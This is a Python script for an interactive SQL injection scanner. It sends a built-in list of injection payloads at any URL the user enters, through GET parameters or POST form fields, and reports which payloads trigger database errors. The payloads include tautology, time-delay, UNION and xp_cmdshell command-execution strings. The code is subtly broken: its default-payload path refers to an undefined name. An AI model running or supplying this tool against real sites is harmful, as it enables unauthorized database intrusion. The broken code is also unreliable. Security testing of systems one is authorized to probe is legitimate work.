import random
import time
from urllib.parse import urlparse

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)

payloads = [
    "'", "\"", "''", "`", "';", "\";", "'--", "\"--", "'/*", "\"/*",
    "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
    "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1/*", "' OR '1'='1'/*",
    "' OR SLEEP(5)--", "' OR '1'='1' AND SLEEP(5)--",
    "' OR 1=1 ORDER BY 1 --", "' OR 1=1 ORDER BY 10 --",
    "' AND 1=1 --", "' AND 1=2 --", "' AND ASCII(SUBSTRING(@@version,1,1))=52 --",
    "'||(SELECT '')||'", "'||(SELECT version())||'", "') OR ('1'='1",
    "' union select null --", "' union select version() --",
    "' and 1=convert(int,'a') --", "admin' --", "' waitfor delay '0:0:5'--",
    "' || '1'='1", "' OR 1 GROUP BY CONCAT(username, password) --",
    "') OR '1'='1", "' AND 1=1#", "' AND 1=2#", "' or sleep(5)#",
    "'; exec master..xp_cmdshell 'ping 127.0.0.1'--"
]

def load_payloads(file=None):
    if file:
        try:
            with open(file, "r") as f:
                return [line.strip() for line in f if line.strip()]
        except:
            print(Fore.RED + "[!] Couldn't read payload file, using default.")
    return DEFAULT_PAYLOADS

def get_form_fields(url):
    try:
        soup = BeautifulSoup(requests.get(url).text, "html.parser")
        form = soup.find("form")
        inputs = form.find_all("input")
        fields = {}
        for i in inputs:
            name = i.get("name")
            if name:
                fields[name] = ""
        return fields
    except Exception as e:
        print(Fore.RED + f"[!] Failed to detect form: {e}")
        return {}

def get_user_input():
    print(Fore.CYAN + "\n====== Advanced SQL Injection Scanner ======\n")

    url = input(Fore.BLUE + "[?] Enter target URL: ")
    if "=" not in url and "?" not in url:
        print(Fore.RED + "[!] URL must contain at least one parameter.")
        exit()

    method = input(Fore.YELLOW + "[?] Method [GET/POST]: ").strip().upper()
    if method not in ["GET", "POST"]:
        print(Fore.RED + "[!] Invalid method.")
        exit()

    data = {}
    if method == "POST":
        auto_detect = input(Fore.MAGENTA + "[?] Auto-detect form fields? [Y/n]: ").strip().lower()
        if auto_detect != "n":
            data = get_form_fields(url)
        else:
            raw_data = input(Fore.YELLOW + "[?] Enter POST data (e.g. user=&pass=): ")
            try:
                data = dict(x.split("=") for x in raw_data.split("&"))
            except:
                print(Fore.RED + "[!] Invalid format.")
                exit()

    proxy = None
    if input(Fore.LIGHTMAGENTA_EX + "[?] Use Proxy? [y/N]: ").lower() == "y":
        proxy_url = input("Proxy (e.g. http://127.0.0.1:8080): ")
        proxy = {"http": proxy_url, "https": proxy_url}

    delay = float(input(Fore.LIGHTBLUE_EX + "[?] Delay between requests (sec) [0]: ") or 0)
    debug = input(Fore.LIGHTWHITE_EX + "[?] Debug mode? [y/N]: ").lower() == "y"
    file = input(Fore.LIGHTCYAN_EX + "[?] External payloads file? (Leave empty for default): ").strip()
    payloads = load_payloads(file)

    return url, method, data, delay, proxy, debug, payloads

def test_payloads(url, method, data, delay, proxy, debug, payloads):
    working_payloads = []
    session = requests.Session()
    headers = {"User-Agent": "SQLiScanner/2.0"}

    start = time.time()

    for payload in payloads:
        try:
            if method == "GET":
                target = url + payload
                res = session.get(target, headers=headers, timeout=10, proxies=proxy)
            else:
                test_data = {k: v + payload for k, v in data.items()}
                res = session.post(url, data=test_data, headers=headers, timeout=10, proxies=proxy)

            errors = ["sql", "syntax", "mysql", "you have an error", "unterminated"]
            if res.status_code >= 500 or any(e in res.text.lower() for e in errors):
                print(Fore.GREEN + f"[+] Payload worked: {payload}")
                working_payloads.append(payload)
            elif debug:
                print(Fore.LIGHTBLACK_EX + f"[-] Payload failed: {payload}")
        except Exception as e:
            if debug:
                print(Fore.RED + f"[!] Error: {payload} -> {e}")
        time.sleep(delay)

    end = time.time()
    print(Fore.MAGENTA + f"\n⏱️ Finished in {round(end - start, 2)} seconds")

    if working_payloads:
        with open("sqli_results.txt", "w") as f:
            for w in working_payloads:
                f.write(w + "\n")
        print(Fore.GREEN + f"[✓] {len(working_payloads)} payload(s) saved in sqli_results.txt")
    else:
        print(Fore.RED + "[-] No successful payloads found.")

def main():
    url, method, data, delay, proxy, debug, payloads = get_user_input()
    test_payloads(url, method, data, delay, proxy, debug, payloads)

if __name__ == "__main__":
    main()
